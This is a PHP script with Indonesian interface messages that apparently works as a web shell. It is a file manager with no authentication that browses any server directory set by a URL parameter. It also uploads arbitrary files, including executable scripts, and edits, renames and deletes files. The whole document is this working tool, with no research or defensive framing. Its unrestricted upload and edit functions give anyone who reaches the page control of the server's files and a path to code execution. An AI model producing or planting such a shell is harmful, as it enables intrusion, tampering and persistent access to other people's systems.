<?php
function createBreadcrumb($currentDir)
{
    $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
    $breadcrumb = array();
    $path = '';

    foreach ($parts as $part) {
        if ($part === '') continue;
        $path .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>";
    }

    return implode(DIRECTORY_SEPARATOR, $breadcrumb);
}

$directory = isset($_GET['dir']) ? $_GET['dir'] : ".";
$directory = @realpath($directory);

if (!$directory || !is_dir($directory)) {
    die("Direktori tidak valid.");
}

$message = ""; 


if (isset($_POST['upload'])) {
    if ($_FILES['file']['error'] === UPLOAD_ERR_NO_FILE) {
        $message = "Tidak ada file yang dipilih.";
    } else {
        $targetFile = $directory . "/" . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            $message = "File berhasil diupload.";
        } else {
            $message = "Gagal mengupload file.";
        }
    }
}


if (isset($_GET['delete'])) {
    $target = $directory . "/" . basename($_GET['delete']);
    if (is_file($target)) {
        if (unlink($target)) {
            $message = "File berhasil dihapus.";
        } else {
            $message = "Gagal menghapus file.";
        }
    } else {
        $message = "Objek tidak valid untuk dihapus.";
    }
}

if (isset($_POST['edit'])) {
    $fileToEdit = $directory . "/" . basename($_POST['file_name']);
    if (is_file($fileToEdit)) {
        if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
            $message = "File berhasil diedit.";
        } else {
            $message = "Gagal menyimpan perubahan file.";
        }
    } else {
        $message = "File tidak ditemukan.";
    }
}

if (isset($_POST['rename'])) {
    $oldName = $directory . "/" . basename($_POST['old_name']);
    $newName = $directory . "/" . basename($_POST['new_name']);
    if (rename($oldName, $newName)) {
        $message = "Nama berhasil diubah.";
    } else {
        $message = "Gagal mengganti nama.";
    }
}

echo "<h2>DIR~: " . createBreadcrumb($directory) . "</h2>";

echo "<h3>Upload File</h3>";
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file'>";
echo "<input type='submit' name='upload' value='Upload'>";
echo "</form>";

if ($message !== "") {
    echo "<p style='color: green;'>" . htmlspecialchars($message) . "</p>";
}

echo "<ul style='list-style:none; padding:0;'>";

if (isset($_GET['edit'])) {
    $fileToEdit = $directory . "/" . basename($_GET['edit']);
    if (is_file($fileToEdit)) {
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<h3>Edit File: " . htmlspecialchars($_GET['edit']) . "</h3>";
        echo "<form method='post'>";
        echo "<textarea name='file_content' rows='10' cols='50'>$content</textarea><br>";
        echo "<input type='hidden' name='file_name' value='" . htmlspecialchars($_GET['edit']) . "'>";
        echo "<input type='submit' name='edit' value='Simpan'>";
        echo "</form>";
    } else {
        echo "File tidak ditemukan.";
    }
}

if (isset($_GET['rename'])) {
    $itemToRename = $directory . "/" . basename($_GET['rename']);
    if (is_file($itemToRename) || is_dir($itemToRename)) {
        echo "<h3>Rename : " . htmlspecialchars($_GET['rename']) . "</h3>";
        echo "<form method='post'>";
        echo "<input type='text' name='new_name' placeholder='Nama baru'>";
        echo "<input type='hidden' name='old_name' value='" . htmlspecialchars($_GET['rename']) . "'>";
        echo "<input type='submit' name='rename' value='Rename'>";
        echo "</form>";
    } else {
        echo "File atau folder tidak ditemukan.";
    }
}

$folders = array();
$files = array();

if ($dh = @opendir($directory)) {
    while (($file = readdir($dh)) !== false) {
        if ($file == "." || $file == "..") continue;
        $path = $directory . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            $folders[] = $file;
        } else {
            $files[] = $file;
        }
    }
    closedir($dh);
} else {
    echo "<li>none</li>";
}

foreach ($folders as $folder) {
    $path = $directory . "/" . $folder;
    $isEditable = is_writable($path);
    $color = $isEditable ? 'green' : 'red'; 
    echo "<li style='color: $color;'><b>[DIR]</b> <a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($folder) . "</a>";
    echo " <a href='?dir=" . urlencode($directory) . "&delete=" . urlencode($folder) . "' 
        style='color:red;' onclick='return confirm(\"Yakin ingin menghapus folder ini?\")'>[Delete]</a></li>";
}

foreach ($files as $file) {
    $path = $directory . "/" . $file;
    $isEditable = is_writable($path);
    $color = $isEditable ? 'green' : 'red';
    echo "<li style='color: $color;'><b>[FILE]</b> " . htmlspecialchars($file);
    echo " <a href='?edit=" . urlencode($file) . "&dir=" . urlencode($directory) . "'style='color:red;'>[Edit]</a>";
    echo " <a href='?dir=" . urlencode($directory) . "&rename=" . urlencode($file) . "' style='color:red;'>[Rename]</a>";
    echo " <a href='?dir=" . urlencode($directory) . "&delete=" . urlencode($file) . "' 
        style='color:red;' onclick='return confirm(\"Yakin ingin menghapus file ini?\")'>[Delete]</a>";
}
echo "</ul>";
?>
